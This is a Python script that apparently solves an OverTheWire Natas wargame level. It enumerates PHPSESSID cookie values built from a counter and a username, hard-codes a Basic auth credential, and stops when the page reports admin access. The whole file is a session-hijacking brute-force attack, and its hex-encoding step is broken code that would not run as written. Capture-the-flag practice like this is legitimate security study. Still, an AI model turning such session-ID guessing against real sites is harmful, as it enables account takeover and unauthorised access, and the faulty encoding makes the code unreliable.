import requests
from bs4 import BeautifulSoup

def get_try(number, username):
    text = f"{number}={username}"
    encoded = hex(text)
    return encoded

headers = {"Authorization": "Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==", "Cookie": "PHPSESSID="}
users_to_test = ["admin", "natas20", "natas19"]
for username in users_to_test:
    for i in range(1, 641):
        pw_try = get_try(i, username)
        req_headers = headers.copy()
        req_headers["Cookie"] += pw_try
        result = requests.get("http://natas18.natas.labs.overthewire.org", headers=req_headers)
        print(f"Try: {i}-{username}/{pw_try}")
        soup = BeautifulSoup(result.content, "html.parser")
        div = soup.find("div", id="content")
        text = div.get_text()
        print(text)
        if (text.startswith("You are an admin")):
            break